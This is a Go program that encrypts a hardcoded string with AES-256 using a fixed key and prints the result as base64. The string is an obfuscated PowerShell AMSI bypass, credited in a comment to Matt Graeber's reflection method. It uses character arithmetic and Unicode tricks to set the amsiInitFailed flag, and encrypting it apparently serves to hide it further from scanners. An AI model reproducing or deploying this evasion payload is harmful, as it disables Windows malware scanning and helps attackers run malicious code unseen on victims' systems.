package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
)

func main() {
	// Key for AES encryption (32 bytes for AES-256)
	key := []byte("supersecretkey123456789012345678") // 32 bytes key for AES-256

	// Message to be encrypted
	message := `#Matt Graebers Reflection method 
$q8UiKIo0vJ5wHjZ18fP=$null;$o97yHz7jXd14l_sFs="System.$(('Mã'+'nä'+'gè'+'mè'+'nt').NormAlize([cHAR]([BYte]0x46)+[CHAr](111)+[chAR](114+37-37)+[char]([bYte]0x6d)+[chaR](68*27/27)) -replace [chAr](92*77/77)+[char]([BYte]0x70)+[cHAr](123*15/15)+[char]([bYTE]0x4d)+[ChAr](110+54-54)+[ChAr](125+118-118)).$([ChAr](65)+[CHar]([BytE]0x75)+[Char]([bYte]0x74)+[CHar]([byTE]0x6f)+[CHAr]([BYTe]0x6d)+[CHaR]([ByTE]0x61)+[chAr]([bYTE]0x74)+[cHAr]([BYte]0x69)+[chaR](111+57-57)+[CHar]([byTE]0x6e)).$(('ÄmsîÚ'+'tîls').NORmalIze([chAR](70+52-52)+[cHAr](111)+[CHar]([BYTe]0x72)+[cHAR](90+19)+[ChAR](68)) -replace [chAr]([bYTe]0x5c)+[ChAr](38+74)+[cHAr]([bYTe]0x7b)+[ChAr]([ByTe]0x4d)+[ChAr]([BytE]0x6e)+[CHAr](125*79/79))";$ppwlttivrx="+('díp'+'qxr'+'vãõ'+'ùùä'+'vkd'+'ncj').nORMAliZE([Char]([bYTe]0x46)+[cHAR](111)+[ChAR]([BYtE]0x72)+[CHAr](84+25)+[Char]([byte]0x44)) -replace [cHar](92)+[cHar]([BytE]0x70)+[cHar]([bYTE]0x7b)+[CHAr]([bytE]0x4d)+[CHar]([bytE]0x6e)+[chaR](125+84-84)";[Threading.Thread]::Sleep(256);[Ref].Assembly.GetType($o97yHz7jXd14l_sFs).GetField($([ChAR](97*26/26)+[cHaR]([BYtE]0x6d)+[ChAR]([Byte]0x73)+[ChAr](105*64/64)+[Char]([bYtE]0x49)+[cHAr]([bYTE]0x6e)+[chAr]([BYTE]0x69)+[CHaR]([Byte]0x74)+[ChaR](62+8)+[Char]([BYte]0x61)+[cHaR](105+27-27)+[ChAr](108)+[cHaR]([BYte]0x65)+[cHar]([ByTe]0x64)),"NonPublic,Static").SetValue($q8UiKIo0vJ5wHjZ18fP,$true);$gbdmuelfdemotosakhinzzbkjop="+[ChAR]([bYTe]0x73)+[chaR](87+28)+[chAR]([bYte]0x72)+[chAr](114)+[CHar]([BYTE]0x70)+[cHaR](118*53/53)+[CHar]([BYtE]0x7a)+[CHAr](107+56-56)+[cHaR]([ByTe]0x62)+[char](119*93/93)+[Char]([byte]0x78)+[CHar](36+61)";[Threading.Thread]::Sleep(1848)`

	// Encrypt the message
	encrypted, err := aesEncrypt([]byte(message), key)
	if err != nil {
		fmt.Println("Error encrypting:", err)
		return
	}

	// Output the encrypted message as base64
	fmt.Println("AES Encrypted (Base64):", base64.StdEncoding.EncodeToString(encrypted))
}

// aesEncrypt encrypts plaintext using AES in CBC mode with PKCS7 padding
func aesEncrypt(plaintext []byte, key []byte) ([]byte, error) {
	// Create AES cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Apply padding (PKCS7 padding)
	padding := aes.BlockSize - len(plaintext)%aes.BlockSize
	paddedText := append(plaintext, byte(padding))
	for i := 1; i < padding; i++ {
		paddedText = append(paddedText, byte(padding))
	}

	// Generate a new IV (initialization vector)
	ciphertext := make([]byte, aes.BlockSize+len(paddedText)) // Allocate space for IV + padded plaintext
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// Encrypt the message using AES in CBC mode
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], paddedText)

	return ciphertext, nil
}
